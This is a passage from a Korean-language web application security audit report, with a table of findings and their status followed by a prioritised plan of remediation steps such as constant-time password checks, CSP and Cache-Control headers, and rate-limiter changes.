| SEC-09 | 비밀정보 노출 | — | ✅ 수정 완료 |
| SEC-10 | CORS/보안헤더 | — | ✅ 수정 완료 (CSP 제외) |
| SEC-11 | Rate Limiting | — | ✅ 기본 수정 완료 |
| SEC-12 | 비즈니스 로직 | N/A | ✅ 안전 |
| SEC-13 | Race Condition | N/A | ✅ SQLite 환경 안전 |
| SEC-14 | Dependency | — | ✅ 수정 완료 |
| SEC-15 | 로그/에러 처리 | N/A | ✅ 안전 |
| **SEC-T01** | **타이밍 공격 (계정 열거)** | 🔴 **High** | ✅ 수정 완료 |
| **SEC-T02** | **Rate Limit IP 우회** | 🟠 **Medium** | ✅ 수정 완료 |
| **SEC-T03** | **CSP 부재** | 🟠 **Medium** | ✅ 수정 완료 |
| **SEC-T04** | **멀티워커 Rate Limit** | 🟠 **Medium** | ⚠️ 아키텍처 한계 (Redis 전환 시 해소) |
| **SEC-T05** | **localStorage 토큰** | 🟡 Low | ⚠️ 권고 사항 |
| **SEC-T06** | **Cache-Control 누락** | 🟡 Low | ✅ 수정 완료 |
| **SEC-T07** | **대용량 응답 DoS** | 🟡 Low | ⚠️ 권고 사항 |
| **SEC-T08** | **Sync Endpoint 블로킹** | 🟡 Low | ⚠️ 권고 사항 |
| SEC-T09 | Session Fixation | N/A | ✅ 안전 |
| SEC-T10 | 토큰 엔트로피 | N/A | ✅ 안전 |
| SEC-T11 | Mass Assignment | N/A | ✅ 안전 |
| SEC-T12 | 계정 열거 (메시지) | N/A | ✅ 안전 |
| SEC-T13 | API 자동화 공격 | 🟠 Medium | ⚠️ 부분 방어 |
| SEC-T14 | CORS 최소 권한 | ℹ️ Info | ⚠️ 권고 사항 |
| SEC-T15 | Supply Chain | 🟡 Low | ⚠️ 권고 사항 |

## 우선순위별 조치 계획

### P0 — 즉시 ✅ 완료

1. **SEC-T01 타이밍 공격**: `_DUMMY_HASH` + 항상 `verify_password` 실행 → `auth_router.py`
2. **SEC-T02 Rate Limit IP**: `_get_client_ip()` 헬퍼로 X-Forwarded-For/X-Real-IP 추출 → `auth_router.py`

### P1 — 1주 이내 ✅ 완료

3. **SEC-T03 CSP**: `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` → `main.py`
4. **SEC-T06 Cache-Control**: `GET /`에 `no-store` 헤더 추가 → `main.py`
5. **SEC-T13 Retry-After**: 429 응답에 `Retry-After` 헤더 추가 → `auth_router.py`
6. **SEC-T14 CORS**: `allow_methods`, `allow_headers` 명시적 최소화 → `main.py`

### P2 — 배포 전

6. **SEC-T04 멀티워커**: 멀티워커 배포 시 Redis Rate Limiter 전환
7. **SEC-T15 pip freeze**: `requirements-lock.txt` 생성 및 `pip-audit` CI 추가
8. **SEC-13 PostgreSQL**: 이전 시 `SELECT FOR UPDATE` 적용

### P3 — 개선 사항

9. **SEC-T05 sessionStorage**: UX 정책에 따라 전환 검토
10. **SEC-T08 비동기 Sync**: `asyncio.create_subprocess_exec()`로 전환
11. **SEC-T14 CORS**: `allow_methods`, `allow_headers` 최소화

---

*본 보고서는 2026-03-17 기준 코드 스냅샷을 대상으로 작성되었습니다. 코드 변경 시 재검토가 필요합니다.*
